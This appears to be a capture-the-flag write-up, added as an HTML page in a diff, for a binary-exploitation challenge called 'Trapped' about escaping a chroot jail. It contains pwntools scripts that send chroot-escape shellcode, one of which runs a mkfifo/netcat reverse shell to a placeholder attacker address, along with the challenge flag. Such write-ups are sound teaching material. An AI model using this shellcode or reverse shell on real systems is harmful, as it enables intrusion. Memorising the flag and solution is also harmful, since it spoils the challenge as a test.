@@ -1,0 +1,66 @@
+<h1 id="️-trapped">⚒️ Trapped</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>⚒️ Binary Exploitation</td>
+      <td>Wittner</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>Well… I’m trapped. Feels like I’m in jail. Can you get the flag?</p>
+
+<blockquote>
+  <p>[!NOTE]
+The flag is in the root directory at <code class="language-plaintext highlighter-rouge">/flag.txt</code></p>
+</blockquote>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>Binary Exploitation</li>
+  <li>CHROOT Escape</li>
+</ul>
+
+<h2 id="solve-option-1">Solve Option 1</h2>
+<p>Print flag - replace <code class="language-plaintext highlighter-rouge">TARGET_IP</code> with server IP address:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span>
+<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">TARGET_IP</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">open?</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">notes</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">next?</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="sh">"</span><span class="s">..</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">chroot</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">execve</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">cat /flag.txt</span><span class="sh">"</span><span class="p">])))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h2 id="solve-option-2">Solve Option 2</h2>
+<p>Revshell - replace <code class="language-plaintext highlighter-rouge">TARGET_IP</code> with server IP address<br />
+Replace <code class="language-plaintext highlighter-rouge">YOUR_IP</code> and <code class="language-plaintext highlighter-rouge">PORT</code> with your IP address and <code class="language-plaintext highlighter-rouge">nc</code> port you are using.<br />
+Run NetCat on your machine:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 7777
+</code></pre></div></div>
+
+<p>Then run the reverse shell Python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">"</span><span class="s">amd64</span><span class="sh">"</span>
+<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">TARGET_IP</span><span class="sh">"</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">open?</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">notes</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">next?</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">chdir</span><span class="p">(</span><span class="sh">"</span><span class="s">..</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">chroot</span><span class="p">(</span><span class="sh">"</span><span class="s">.</span><span class="sh">"</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">execve</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-c</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_IP PORT &gt;/tmp/f</span><span class="sh">"</span><span class="p">])))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{5f8c037a7ca4cb89c80174bca5eaf531}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
